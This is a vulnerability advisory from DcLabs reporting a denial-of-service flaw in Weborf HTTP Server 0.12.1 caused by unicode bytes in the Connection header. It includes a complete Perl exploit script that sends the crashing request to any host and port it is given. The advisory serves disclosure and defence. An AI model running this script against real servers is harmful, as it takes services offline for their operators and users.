@@ -1,0 +1,64 @@
+[DCA-0012]
+
+[Software]
+- Weborf HTTP Server
+
+[Vendor Product Description]
+- Weborf is a lightweight Web server written in C. It supports IPv6
+and basic authentication. It doesn't implement the full HTTP
+specification, but can be used to easily share directories or files.
+
+[Bug Description]
+- Weborf HTTP Server can't handle unicode characters in "Connection: "
+general header-field leading to a Denial-of-Service flaw
+
+[History]
+- Advisory sent to vendor on 06/21/2010.
+- Vendor reply 06/22/2010.
+- Vendor patch published 06/23/2010
+
+
+[Impact]
+- Low
+
+[Affected Version]
+-Weborf 0.12.1
+- Prior versions may also be vulnerable.
+
+[Exploit]
+
+#!/usr/bin/perl
+use IO::Socket;
+
+       if (@ARGV < 1) {
+               usage();
+       }
+
+       $ip     = $ARGV[0];
+       $port   = $ARGV[1];
+
+       print "[+] Sending request...\n";
+
+       $socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr =>
+"$ip", PeerPort => "$port") || die "[-] Connection FAILED!\n";
+       print $socket "GET / HTTP/1.0\r\n";
+       print $socket "Connection: ". "\0x99" x 4 ."\r\n\r\n";
+
+       close($socket);
+
+       print "[+] Done!\n";
+
+sub usage() {
+       print "[-] Usage: <". $0 ."> <host> <port>\n";
+       print "[-] Example: ". $0 ." 127.0.0.1 80\n";
+       exit;
+}
+---------------------------------------------------------------------------------
+-------
+
+DcLabs Security Group
+Sponsor: ipax
+ipax@dclabs.com.br
+
+[Credits]
+Crash and all DcLabs members.
